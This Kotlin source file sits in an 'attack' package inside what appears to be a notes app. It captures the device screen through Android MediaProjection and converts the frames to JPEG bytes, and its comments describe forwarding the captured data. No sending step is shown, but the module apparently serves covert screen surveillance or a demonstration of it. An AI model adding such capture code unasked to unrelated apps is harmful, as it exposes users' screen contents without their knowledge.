package org.fossify.notes.attack

import android.app.Activity
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Bitmap.CompressFormat
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.nio.Buffer


/**
 * 录屏数据回调接口
 * 注意：避免与 Android 系统的 ScreenCaptureCallback 混淆
 */
interface ScreenRecorderCallback {
    /**
     * 当接收到新的视频帧时调用
     * @param image 视频帧图像数据
     * @param width 宽度
     * @param height 高度
     */
    fun onFrameCaptured(image: Image, width: Int, height: Int)
    
    /**
     * 录屏开始
     */
    fun onRecordingStarted()
    
    /**
     * 录屏停止
     */
    fun onRecordingStopped()
    
    /**
     * 发生错误
     */
    fun onError(error: String)
}

/**
 * 屏幕录制器
 * 用于捕获屏幕内容并转发数据
 */
class ScreenRecorder(private val context: Context) {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var callback: ScreenRecorderCallback? = null
    private var isRecording = false
    
    private val displayMetrics: DisplayMetrics by lazy {
        val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val display = windowManager.defaultDisplay
        val metrics = DisplayMetrics()
        display.getRealMetrics(metrics)
        metrics
    }
    
    companion object {
        private const val TAG = "ScreenRecorder"
        private const val VIRTUAL_DISPLAY_NAME = "ScreenRecorder"
        private const val VIRTUAL_DISPLAY_DPI = 160
    }
    
    /**
     * 请求录屏权限
     * @param activity Activity
     * @param requestCode 请求码
     */
    fun requestPermission(activity: Activity, requestCode: Int) {
        val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        activity.startActivityForResult(captureIntent, requestCode)
        Log.i(TAG, "请求录屏权限")
    }
    
    /**
     * 开始录屏
     * @param resultCode Activity result code
     * @param data Intent data
     * @param callback 数据回调
     */
    fun startRecording(resultCode: Int, data: android.content.Intent, callback: ScreenRecorderCallback) {
        if (isRecording) {
            Log.w(TAG, "录屏已在进行中")
            return
        }
        
        this.callback = callback
        
        try {
            val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
            
            val width = displayMetrics.widthPixels
            val height = displayMetrics.heightPixels
            
            // 创建 ImageReader 来接收屏幕帧
            // 使用 RGB_565 格式，可以直接转换为 Bitmap 然后压缩为 JPEG
            // 如果 RGB_565 不支持，回退到 YUV_420_888
            imageReader = try {
                ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            } catch (e: Exception) {
                throw IllegalArgumentException("No supported RGBA_8888 image format available for screen recording", e)
            }
            
            // 设置图像监听器
            imageReader?.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    image?.let {
                        try {
                            callback.onFrameCaptured(it, width, height)
                        } catch (e: Exception) {
                            Log.e(TAG, "处理图像帧时出错: ${e.message}", e)
                            // 确保即使回调出错也关闭 image
                            it.close()
                        }
                        // 注意：image 应该在回调中关闭，如果没有关闭，这里确保关闭
                        // 但通常回调应该负责关闭
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "获取图像失败: ${e.message}", e)
                }
            }, null)
            
            // 必须先注册回调，然后才能创建 VirtualDisplay
            val projectionCallback = object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.i(TAG, "MediaProjection 已停止")
                    stopRecording()
                }
            }
            
            // 注册停止监听（必须在 createVirtualDisplay 之前）
            mediaProjection?.registerCallback(projectionCallback, null)
            
            // 创建虚拟显示
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                VIRTUAL_DISPLAY_NAME,
                width,
                height,
                VIRTUAL_DISPLAY_DPI,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface,
                null,
                null
            )
            
            isRecording = true
            Log.i(TAG, "录屏已开始: ${width}x${height}")
            callback.onRecordingStarted()
            
        } catch (e: Exception) {
            Log.e(TAG, "开始录屏失败: ${e.message}", e)
            callback.onError("开始录屏失败: ${e.message}")
            isRecording = false
        }
    }
    
    /**
     * 停止录屏
     */
    fun stopRecording() {
        if (!isRecording) {
            return
        }
        
        try {
            virtualDisplay?.release()
            virtualDisplay = null
            
            imageReader?.close()
            imageReader = null
            
            mediaProjection?.stop()
            mediaProjection = null
            
            isRecording = false
            Log.i(TAG, "录屏已停止")
            callback?.onRecordingStopped()
            
        } catch (e: Exception) {
            Log.e(TAG, "停止录屏失败: ${e.message}", e)
            callback?.onError("停止录屏失败: ${e.message}")
        } finally {
            callback = null
        }
    }
    
    /**
     * 检查是否正在录屏
     */
    fun isRecording(): Boolean = isRecording
    
    /**
     * 获取屏幕宽度
     */
    fun getScreenWidth(): Int = displayMetrics.widthPixels
    
    /**
     * 获取屏幕高度
     */
    fun getScreenHeight(): Int = displayMetrics.heightPixels
}

/**
 * 图像数据处理工具类
 */
object ImageProcessor {
    private const val TAG = "ImageProcessor"
    
    /**
     * 将 Image 转换为 JPEG 字节数组
     * @param image Image 对象
     * @param quality JPEG 压缩质量 (0-100)，默认 80
     * @return JPEG 字节数组，如果转换失败返回 null
     */
    fun imageToJpeg(image: Image, quality: Int = 80): ByteArray? {
        return try {
            convertToJpeg(image, quality)
        } catch (e: Exception) {
            Log.e(TAG, "转换为 JPEG 失败: ${e.message}", e)
            null
        } finally {
            image.close()
        }
    }

    fun convertToJpeg(image: Image, quality: Int = 80): ByteArray? {
        var bitmap: Bitmap? = null
        val byteArrayOutputStream = ByteArrayOutputStream()

        try {
            // Get the latest image
                val width =  image.width
            val height =  image.height
                val planes = image.planes
                val imageBuffer: Buffer = planes[0]!!.getBuffer().rewind()

                val pixelStride = planes[0]!!.pixelStride
                val rowStride = planes[0]!!.rowStride
                val rowPadding = rowStride - pixelStride * width

                // Create bitmap
                bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(imageBuffer)

                // Compress the bitmap to JPEG and store in byte array
                bitmap.compress(CompressFormat.JPEG, quality, byteArrayOutputStream)

        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }

        // Convert ByteArrayOutputStream to byte array and return it
        return byteArrayOutputStream.toByteArray()
    }

}

